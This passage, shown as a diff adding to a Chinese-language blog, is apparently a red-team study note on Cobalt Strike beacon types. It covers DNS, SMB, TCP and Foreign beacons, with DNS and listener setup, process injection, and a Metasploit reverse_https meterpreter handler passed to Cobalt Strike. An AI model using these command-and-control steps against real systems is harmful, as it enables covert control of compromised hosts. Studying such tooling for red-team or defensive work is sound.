@@ -307,3 +307,107 @@ https://www.bamsoftware.com/papers/fronting/
 
 
 
+析由你的CS团队服务器作为权威DNS服务器的域名。DNS响应告诉Beacon休眠或是连接到团队服务器来下载任务，DNS响应也告诉 Beacon 如何从你的团队服务器下载任务。
+
+在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。
+
+DNS Beacon的工作流程具体如下：
+
+首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。
+
+![image-20240223161626900](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png)
+
+原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。
+
+根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。
+
+**域名配置**
+
+既然是配置域名，所以就需要先有个域名，添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。然后服务器配置防火墙将UDP的53端口放通。（这里我没有多余的服务器和域名，借用eastjun师傅的图）
+
+![image-20211202223623912](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png)
+
+配置完可以使用nslookup进行测试
+
+![image-20211202224423180](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png)
+
+CS中创建监听器时填写NS记录的域名：
+
+![image-20211202223356738](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png)
+
+靶机上线后不会像其他Beacon一样在第一次连接时就发送目标相关信息，在没有任务的情况下CS服务器都是简单响应DNS请求而不做任何操作，在执行任何一条命令之后靶机会将目标相关信息提交过来。
+
+![image-20211202225129950](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png)
+
+### SMB Beacon
+
+SMB Beacon使用命名管道通过一个父Beacon进行通信，这种对等通信对同一台主机上的Beacon和跨网络的Beacon都有效。Windows将命名管道通信封装仔SMB协议中，因此得名SMB Beacon。
+
+因为使用SMB协议通信，Windows的系统防火墙默认放通445端口，所以SMB Beacon在绕防火墙时可能会有意外作用。
+
+![img](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png)
+
+**SMB Beacon配置**
+
+首先需要一个上线的主机，上线后新建一个SMB Beacon，输入listener名称，选择Beacon SMB，pipename使用默认值即可：
+
+![image-20240227191613502](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png)
+
+然后在初始beacon中迁移到smb beacon：
+
+![image-20240227191819912](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png)
+
+迁移完成后：
+
+![image-20240227191913542](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png)
+
+可以看到派生的SMB Beacon，在external的ip后有个`∞∞`字符。此时SMB Beacon通过父级的HTTPS Beacon与CS服务器进行通信，而SMB Beacon与HTTPS Beacon通过SMB协议进行通信。
+
+![image-20240227192123585](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png)
+
+随后，我们把SMB Beacon注入到一个进程中：
+
+![image-20240227192323558](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png)
+
+注入完成后，SMB Beacon就转变为对应进程派生的beacon了：
+
+![image-20240227192530624](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png)
+
+如果需要断开和某个会话的连接，使用unlink命令即可，想再次连上使用link就可以。
+
+### TCP Beacon
+
+TCP Beacon与SMB Beacon类似，区别在于使用的是TCP协议与父级Beacon进行通信，使用这种方式上线时流量时不加密的。
+
+在新建tcp beacon时可以指定监听的端口，假设为8888，在不出网的目标主机上执行后，目标主机会监听8888端口，然后父Beacon中使用connect命令进行连接：
+
+![image-20220213210419805](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png)
+
+### Foreign Beacon
+
+使用CS的Foreign Beacon可以派生到meterpreter会话，有http和https两种监听器。
+
+首先在msf中起一个监听器：
+
+```shell
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_https
+payload => windows/meterpreter/reverse_https
+msf exploit(handler) > set lhost 10.211.55.2
+lhost => msf ip
+msf exploit(handler) > set lport 4444
+lport => 4444
+msf exploit(handler) > exploit
+```
+
+然后在cs里配置，填上msf的ip和监听端口。
+
+然后选择会话右键派生，会话选择forign beacon：
+
+![image-20240227195131535](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png)
+
+随后在msf中就会接收到会话：
+
+![image-20240227195228315](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png)
+
+
